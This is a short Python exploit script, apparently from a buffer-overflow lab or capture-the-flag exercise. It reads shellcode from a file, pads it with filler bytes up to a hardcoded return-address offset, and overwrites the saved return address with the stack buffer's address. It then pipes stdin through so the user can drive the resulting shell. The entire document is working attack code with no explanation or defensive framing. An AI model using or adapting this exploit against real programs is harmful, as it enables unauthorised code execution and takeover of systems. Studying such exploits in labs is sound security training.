#!/usr/bin/env python3
import os, sys, struct
addr_buffer = 0x7fffffffe270
addr_retaddr = 0x7fffffffe2f8

shellfile = open("shellcode.bin", "rb") 
shellcode = shellfile.read() 

shellcode += b"A" * ((addr_retaddr - addr_buffer) - len(shellcode)) 

shellcode += struct.pack("<Q", addr_buffer) 

fp = os.fdopen(sys.stdout.fileno(), 'wb')
fp.write(shellcode) 
fp.flush()

while True: 
    try: 
        data = sys.stdin.buffer.read1(1024) 
        if not data: 
            break 

        fp.write(data)
        fp.flush() 
    except KeyboardInterrupt: 
        break
